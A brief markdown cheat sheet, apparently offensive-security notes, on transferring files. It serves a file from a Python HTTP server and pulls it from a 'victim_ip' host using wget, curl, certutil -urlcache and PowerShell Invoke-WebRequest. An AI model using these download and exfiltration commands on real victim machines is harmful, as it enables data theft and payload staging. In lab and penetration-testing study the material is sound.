#### Start a HTTP Server
Start a Python HTTP server:
```
python -m http.server 8080
```


### Pull the File
**Linux**
```
wget http://victim_ip:8080/file.txt
```

```
curl -O http://victim_ip:8080/file.txt
```


**Windows**
In-built tool `certutil`:
```
certutil -urlcache -split -f http://ip:8080/file.txt file.txt
```

curl
```
curl http://victim_ip:8080/file.txt -o file.txt
```

PowerShell
```
Invoke-WebRequest -Uri "http://example.com/file.txt" -OutFile "C:\path\to\save\file.txt"
```

If running from `cmd.exe`, a `batch` file, or a `script` that needs to launch PowerShell
```
powershell -c 'Invoke-WebRequest -Uri "http://example.com/file.txt" -OutFile "C:\path\to\save\file.txt"'
```